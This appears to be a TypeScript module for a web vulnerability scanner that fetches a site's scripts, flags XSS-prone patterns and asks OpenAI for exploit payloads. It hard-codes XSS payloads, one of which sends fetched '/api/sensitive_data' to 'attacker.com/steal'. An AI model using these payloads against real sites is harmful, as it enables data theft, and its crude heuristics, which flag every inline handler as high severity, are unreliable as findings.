import fetch from 'node-fetch';
import { JSDOM } from 'jsdom';
import * as cheerio from 'cheerio';
import { getResponseFromOpenAI } from './openai';

interface CodeVulnerability {
  type: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  foundIn: string;
  suggestedPayload: string;
  lineNumber?: number;
  remediation?: string;
}

interface AnalysisResult {
  url: string;
  extractedScripts: {
    inline: string[];
    external: string[];
  };
  vulnerabilities: CodeVulnerability[];
  rawHtml?: string;
}

/**
 * Fetches a webpage and extracts all JavaScript code (both inline and external)
 */
export async function fetchAndExtractCode(url: string): Promise<{
  html: string;
  inlineScripts: string[];
  externalScripts: { url: string; content: string }[];
}> {
  // Handle URLs without protocol
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    url = 'https://' + url;
  }

  try {
    // Fetch the webpage
    const response = await fetch(url);
    const html = await response.text();

    // Parse HTML
    const dom = new JSDOM(html);
    const document = dom.window.document;

    // Extract inline scripts
    const inlineScriptElements = document.querySelectorAll('script:not([src])');
    const inlineScripts = Array.from(inlineScriptElements).map(
      (script) => script.textContent || ''
    );

    // Extract external script URLs
    const externalScriptElements = document.querySelectorAll('script[src]');
    const externalScriptUrls = Array.from(externalScriptElements)
      .map((script) => script.getAttribute('src') || '')
      .filter((src) => src !== '');

    // Resolve relative URLs
    const baseUrl = new URL(url);
    const resolvedScriptUrls = externalScriptUrls.map((src) => {
      if (src.startsWith('//')) {
        return `https:${src}`;
      }
      if (src.startsWith('/')) {
        return `${baseUrl.origin}${src}`;
      }
      if (!src.startsWith('http')) {
        return new URL(src, url).href;
      }
      return src;
    });

    // Fetch external scripts
    const externalScripts = await Promise.all(
      resolvedScriptUrls.map(async (scriptUrl) => {
        try {
          const scriptResponse = await fetch(scriptUrl);
          const content = await scriptResponse.text();
          return { url: scriptUrl, content };
        } catch (error) {
          console.error(`Failed to fetch script from ${scriptUrl}:`, error);
          return { url: scriptUrl, content: '' };
        }
      })
    );

    return {
      html,
      inlineScripts,
      externalScripts: externalScripts.filter((script) => script.content),
    };
  } catch (error) {
    console.error(`Error fetching and extracting code from ${url}:`, error);
    throw new Error(`Failed to analyze website: ${error.message}`);
  }
}

/**
 * Analyzes HTML source code for potential DOM-based XSS vulnerabilities
 */
function analyzeDomVulnerabilities(html: string): CodeVulnerability[] {
  const vulnerabilities: CodeVulnerability[] = [];
  const $ = cheerio.load(html);

  // Check for potential DOM-based XSS in event handlers
  $('*').each((_, element) => {
    const attributes = $(element).attr();
    if (!attributes) return;

    // Check for inline event handlers
    Object.keys(attributes).forEach((attr) => {
      if (attr.startsWith('on')) {
        vulnerabilities.push({
          type: 'DOM-based XSS',
          description: `Inline event handler found in ${element.tagName} element`,
          severity: 'high',
          foundIn: `<${element.tagName} ${attr}="${attributes[attr]}">`,
          suggestedPayload: `<${element.tagName} ${attr}="alert('XSS')">`,
        });
      }
    });

    // Check for user input directly placed in HTML
    if (attributes.id && (
      attributes.id.includes('user') || 
      attributes.id.includes('input') || 
      attributes.id.includes('data')
    )) {
      vulnerabilities.push({
        type: 'Potential DOM Manipulation',
        description: `Element with ID that suggests user input: ${attributes.id}`,
        severity: 'medium',
        foundIn: `<${element.tagName} id="${attributes.id}">`,
        suggestedPayload: `document.getElementById('${attributes.id}').innerHTML='<img src=x onerror=alert("XSS")>'`,
      });
    }
  });

  return vulnerabilities;
}

/**
 * Analyzes JavaScript code for common vulnerabilities
 */
function analyzeJavaScript(
  script: string, 
  source: string
): CodeVulnerability[] {
  const vulnerabilities: CodeVulnerability[] = [];
  
  // Check for dangerous functions
  const dangerousFunctions = [
    { pattern: /eval\s*\(/g, name: 'eval()' },
    { pattern: /document\.write\s*\(/g, name: 'document.write()' },
    { pattern: /innerHTML\s*=/g, name: 'innerHTML' },
    { pattern: /outerHTML\s*=/g, name: 'outerHTML' },
    { pattern: /insertAdjacentHTML\s*\(/g, name: 'insertAdjacentHTML()' },
    { pattern: /location\.href\s*=/g, name: 'location.href' },
    { pattern: /location\.replace\s*\(/g, name: 'location.replace()' },
  ];

  dangerousFunctions.forEach(({ pattern, name }) => {
    if (pattern.test(script)) {
      vulnerabilities.push({
        type: 'Dangerous JavaScript Function',
        description: `Use of potentially unsafe JavaScript function: ${name}`,
        severity: 'high',
        foundIn: source,
        suggestedPayload: `'"><img src=x onerror=alert("XSS")>`,
      });
    }
  });

  // Check for user input processing
  const userInputPatterns = [
    { pattern: /location\.search/g, name: 'URL parameters (location.search)' },
    { pattern: /location\.hash/g, name: 'URL hash (location.hash)' },
    { pattern: /document\.cookie/g, name: 'document.cookie' },
    { pattern: /localStorage/g, name: 'localStorage' },
    { pattern: /sessionStorage/g, name: 'sessionStorage' },
    { pattern: /\.value/g, name: 'DOM element value' },
  ];

  userInputPatterns.forEach(({ pattern, name }) => {
    if (pattern.test(script)) {
      vulnerabilities.push({
        type: 'User Input Processing',
        description: `Code accesses ${name} which could contain user input`,
        severity: 'medium',
        foundIn: source,
        suggestedPayload: `javascript:alert(document.domain)`,
      });
    }
  });

  // Check for AJAX/fetch calls
  if (/\$\.ajax|\$\.get|\$\.post|fetch\s*\(|XMLHttpRequest/g.test(script)) {
    vulnerabilities.push({
      type: 'AJAX/Fetch Request',
      description: 'Code makes AJAX or fetch requests that may be vulnerable to CSRF',
      severity: 'medium',
      foundIn: source,
      suggestedPayload: `'"><script>fetch('/api/sensitive_data').then(r=>r.text()).then(t=>fetch('https://attacker.com/steal?data='+btoa(t)))</script>`,
    });
  }

  return vulnerabilities;
}

/**
 * Uses OpenAI to analyze code for vulnerabilities
 */
async function analyzeWithAI(code: string, url: string): Promise<CodeVulnerability[]> {
  try {
    // Prepare a condensed version of the code if it's too long
    const codeToAnalyze = code.length > 5000 
      ? code.substring(0, 5000) + '\n... (truncated for brevity)'
      : code;
    
    const prompt = `
Analyze the following JavaScript code from website ${url} for security vulnerabilities:

\`\`\`javascript
${codeToAnalyze}
\`\`\`

Identify any security vulnerabilities in this code. Specifically look for:
1. Cross-Site Scripting (XSS) vulnerabilities
2. Insecure DOM manipulation
3. Injection vulnerabilities
4. Potentially dangerous API calls
5. Insecure data handling
6. Authentication/authorization issues

For each vulnerability found, provide:
- The vulnerability type
- A description of the issue
- The severity (low, medium, high, critical)
- The specific code that contains the vulnerability
- A suggested payload that could exploit this vulnerability
- Remediation steps

Format your response as JSON with the following structure:
{
  "vulnerabilities": [
    {
      "type": "string",
      "description": "string",
      "severity": "low|medium|high|critical",
      "foundIn": "string (code snippet)",
      "suggestedPayload": "string",
      "remediation": "string"
    }
  ]
}

If no vulnerabilities are found, return an empty array. Be specific and objective in your analysis.
`;

    const aiResponse = await getResponseFromOpenAI(prompt);
    
    try {
      // Extract JSON from the response
      const jsonMatch = aiResponse.match(/```json\s*([\s\S]*?)\s*```/) || 
                         aiResponse.match(/({[\s\S]*})/) ||
                         [null, aiResponse];
      
      const jsonStr = jsonMatch[1];
      const parsedResponse = JSON.parse(jsonStr);
      
      if (parsedResponse && Array.isArray(parsedResponse.vulnerabilities)) {
        return parsedResponse.vulnerabilities;
      }
      
      return [];
    } catch (parseError) {
      console.error("Failed to parse AI response as JSON:", parseError);
      return [];
    }
  } catch (error) {
    console.error("Error in AI analysis:", error);
    return [];
  }
}

/**
 * Main function to analyze a website's source code
 */
export async function analyzeWebsite(url: string): Promise<AnalysisResult> {
  try {
    const { html, inlineScripts, externalScripts } = await fetchAndExtractCode(url);
    
    // Analyze DOM for vulnerabilities
    const domVulnerabilities = analyzeDomVulnerabilities(html);
    
    // Analyze inline scripts
    const inlineVulnerabilities = inlineScripts.flatMap((script, index) => 
      analyzeJavaScript(script, `Inline script #${index + 1}`)
    );
    
    // Analyze external scripts
    const externalVulnerabilities = externalScripts.flatMap(script => 
      analyzeJavaScript(script.content, `External script: ${script.url}`)
    );

    // Combine scripts for AI analysis
    const combinedCode = [
      ...inlineScripts,
      ...externalScripts.map(script => `// Source: ${script.url}\n${script.content}`)
    ].join('\n\n');
    
    // Analyze with AI
    const aiVulnerabilities = await analyzeWithAI(combinedCode, url);
    
    // Combine all vulnerabilities
    const allVulnerabilities = [
      ...domVulnerabilities,
      ...inlineVulnerabilities,
      ...externalVulnerabilities,
      ...aiVulnerabilities
    ];
    
    // Remove duplicates based on type and foundIn
    const uniqueVulnerabilities = allVulnerabilities.filter((vuln, index, self) => 
      index === self.findIndex(v => 
        v.type === vuln.type && 
        v.foundIn === vuln.foundIn
      )
    );
    
    return {
      url,
      extractedScripts: {
        inline: inlineScripts,
        external: externalScripts.map(script => script.url)
      },
      vulnerabilities: uniqueVulnerabilities,
    };
  } catch (error) {
    console.error("Error analyzing website:", error);
    throw new Error(`Failed to analyze website: ${error.message}`);
  }
}